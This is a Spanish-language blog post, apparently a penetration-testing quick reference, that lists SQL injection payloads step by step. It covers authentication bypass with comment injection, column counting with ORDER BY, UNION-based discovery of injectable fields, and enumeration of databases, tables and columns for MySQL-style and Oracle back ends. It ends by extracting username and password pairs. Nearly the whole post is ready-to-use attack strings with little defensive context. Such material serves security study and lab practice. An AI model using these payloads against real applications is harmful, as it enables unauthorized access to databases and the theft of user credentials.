---
title: SQLI
layout: post
post-image: /assets/images/Post/P19/SQLInjection.png
description: Referencia rápida
tags:
- SQLI

---

En este post, proporcionaremos ejemplos y técnicas directo al grano para tener una referencia rápida.

# Base de Datos

![DB](/assets/images/Post/P20/DB.png)

# Objetivo

![P20i1](/assets/images/Post/P20/P20i1.png)

### Indice

- [Retornar datos ocultos](#retornar-datos-ocultos)
- [Eludir inicio de sesión](#eludir-inicio-de-sesión)
- [Identificar número de columnas](#identificar-número-de-columnas)
- [Probar campos inyectables](#probar-campos-inyectables)
- [Extracción de Datos](#extracción-de-datos)
- [Listando DB existentes](#listando-db-existentes)
- [Ver DB en uso](#ver-db-en-uso)
- [Listando Tablas Existentes en todas las DB](#listando-tablas-existentes-en-todas-las-db)
- [Listando Tablas de una DB especifica](#listando-tablas-de-una-db-especifica)
- [Listando Columnas de una Tabla](#listando-columnas-de-una-tabla)
- [Listando contenido de una DB ORACLE](#listando-contenido-de-una-db-oracle)


## Retornar datos ocultos

---

El objetivo es manipular la condición para que siempre sea verdadera, de modo que la consulta retorne todos los registros en la tabla. 

```sql
' or 1=1-- -
```

## Eludir inicio de sesión
---

Realizamos la query en el apartado de autenticación.

```sql
'-- -
```

![P20i2](/assets/images/Post/P20/P20i2.png)


## Identificar número de columnas

---

```sql
' order by (n_columnas)-- -
```

- Ejemplo si hay dos columnas

```sql
' ORDER BY 2-- -
```

## Probar campos inyectables
---

```sql
' UNION SELECT NULL,'Probando'-- -
```

```sql
' UNION SELECT 'Probando',NULL-- -
```

## Extracción de Datos
---

En donde **NULL** es la columna en donde quiero extraer los datos:

```sql
' UNION SELECT NULL,NULL,NULL-- -
```

- Probando en la columna 1:

```sql
' UNION SELECT 'VkItMD',NULL,NULL-- -
```

## Listando DB existentes
---

```sql
' UNION SELECT NULL,schema_name from information_schema.schemata-- -
```

- Lo mismo pero te separa las bases de datos por comas:

```sql
' UNION SELECT NULL,group_concat(schema_name) from information_schema.schemata-- -
```

## Ver DB en uso
---

```sql
' UNION SELECT NULL,database()-- -
```

- Supongamos que la base de datos no esta en uso y quieres listarla, a veces tienes que especificar la base de base de datos en uso, eso lo haces con:

```sql
' UNION SELECT NULL, group_concat(username,':',password) from tienda.users-- -

# En donde tienda es la que esta en uso
```

## Listando Tablas Existentes en todas las DB
---

```sql
' UNION SELECT table_name,NULL from information_schema.tables-- -
```

## Listando Tablas de una DB especifica
---

```sql
' UNION SELECT table_name,NULL from information_schema.tables where table_schema = 'public'-- -
```

## Listando Columnas de una Tabla
---

```sql
' UNION SELECT column_name,NULL from information_schema.columns where table_schema = 'DB' and table_name = 'tabla'-- -
```

## Listando el Contenido de una Columna
---

```sql
' UNION SELECT username,password from users-- -
```

- otras formas:

```sql
' UNION SELECT NULL,group_concat(username,':',password) from users-- -
```

```sql
' UNION SELECT NULL,group_concat(username,'0x3a',password) from users-- -
```

```sql
' UNION SELECT NULL,username||':'||password from users-- -
```

```sql
' UNION SELECT NULL,concat(username,':',password) from users-- -
```

---

## Listando contenido de una DB ORACLE

- Determinar número de columnas

```sql
' ORDER BY 2-- -
```

- Consulta especia ORACLE

```sql
' UNION SELECT NULL,NULL from dual-- -
```

- Listando todas las tablas de las bases de datos existentes para ORACLE

```sql
' UNION SELECT NULL,table_name from all_tables-- -
```

- Listando por bases de datos de propietarios

```sql
' UNION SELECT NULL,owner from all_tables-- -
```

- Enumerando la tablas de propietarios

```sql
' UNION SELECT NULL,table_name from all_tables where owner = 'PETER'-- -
```

- Listando las columnas 

```sql
' UNION SELECT NULL,column_name from all_tab_columns where table_name = 'USERS_VFDYAP'-- -
```

- Listando el contenido dada una columna


```sql
' UNION SELECT NULL,USERNAME_GTWJZC||':'||PASSWORD_TBLRSL FROM USERS_VFDYAP-- -
```














